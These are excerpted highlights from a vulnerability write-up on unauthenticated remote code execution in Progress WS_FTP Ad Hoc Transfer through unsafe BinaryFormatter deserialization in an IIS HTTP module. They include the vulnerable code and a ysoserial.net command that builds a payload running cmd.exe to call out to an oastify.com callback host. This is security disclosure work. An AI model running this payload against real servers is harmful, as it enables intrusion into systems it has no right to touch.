# RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules

![rw-book-cover](https://blog.assetnote.io/apple-touch-icon-180x180.png)

## Highlights

> vulnerability was found from sink -> source, where we discovered the deserialization sink and worked our way up towards the source.

> Ultimately, we discovered that the vulnerability could be triggered without any authentication, and it affected the entire Ad Hoc Transfer component of WS_FTP.

> IIS HTTP Modules allow developers to run code within the lifecycle of a HTTP request. The convention of HTTP modules is similar to "middleware" that you might see in other web application frameworks.

> The issue discovered in Progress WS_FTP was within a HTTP Module called MyFileUpload.UploadModule

> UploadManager.Instance.DeserializeProcessor(result2.Substring(DEFAULT_PARAMS_TAG.Length));

> internal IFileProcessor DeserializeProcessor(string input)     { BinaryFormatter binaryFormatter = new BinaryFormatter(); byte[] buffer = Convert.FromBase64String(input); MemoryStream serializationStream = new MemoryStream(buffer); SettingsStorageObject settingsStorageObject = (SettingsStorageObject)binaryFormatter.Deserialize(serializationStream);

> In order to execute arbitrary commands through deserialization, we can use ysoserial.net with the following command:
>  ‍
>  ./ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C nslookup wuui3r1tbpx4pwl6ao5dztkiq9w2ks8h.oastify.com" -o base64

> due to the nature of HTTP Modules, the GET URL can be any of the routes within the Ad Hoc Transfer application.
